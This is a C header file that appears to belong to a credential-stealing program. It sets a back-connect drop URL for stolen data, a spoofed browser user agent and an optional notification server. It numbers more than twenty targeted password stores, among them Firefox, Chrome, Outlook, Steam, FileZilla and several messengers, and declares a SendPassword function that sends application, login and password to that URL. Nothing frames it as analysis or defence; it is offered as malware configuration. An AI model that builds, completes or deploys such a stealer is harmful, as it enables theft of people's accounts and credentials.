
// change the URL settings here
#define BackConnectURLA         "http://yourdomain.com/d.php"
//#define BackConnectURLA         "###################################################################################################################################################################################################################################################################"
//#define SqlitePath              "http://yourdomain.com/sqlite3.dll"     // if not specified: sqlite3.dll in default directory (above) is used

// You can use a notification script to send you an automatic email, or to log the execution of the program.
//#define Notification
//#define NotificationServerA     "http://[::1]/a/1.php"

#define HTTPAgent               "Mozilla/5.0 Gecko/2009032609 Firefox/3.0.6"
#define WhatsMyIP               "http://www.google.com/"


#define Password_MSNMessenger           "0"
#define Password_GoogleTalk             "1"
#define Password_TrillianMSN            "2"
#define Password_TrillianAIM            "3"
#define Password_TrillianYahoo          "4"
#define Password_Pidgin                 "5"
#define Password_Paltalk                "6"
#define Password_Steam                  "7"
#define Password_NoIP                   "8"
#define Password_DynDNS                 "9"
#define Password_Firefox                "10"
#define Password_InternetExplorer       "11"
#define Password_FileZilla              "12"
#define Password_FlashFXP               "13"
#define Password_KeyInfo                "14"
#define Password_Outlook                "15"
#define Password_IMVU                   "16"
#define Password_IDM                    "17"
#define Password_Chrome                 "18"
#define Password_Rapidshare             "19"
#define Password_SmartFTP               "20"
#define Password_CoreFTP                "21"
#define Password_FTPCommander           "22"

#define ErrorCodeComputerStart          '2'
#define ErrorCodeStandalone             "1"     // BackConnect_Started - Standalone
#define ReturnCodeSuccessful            0

#define UserPasswordLength              200     // max. length of user names and passwords


int SendPassword(char *application, char *url, char *login, char *pass);
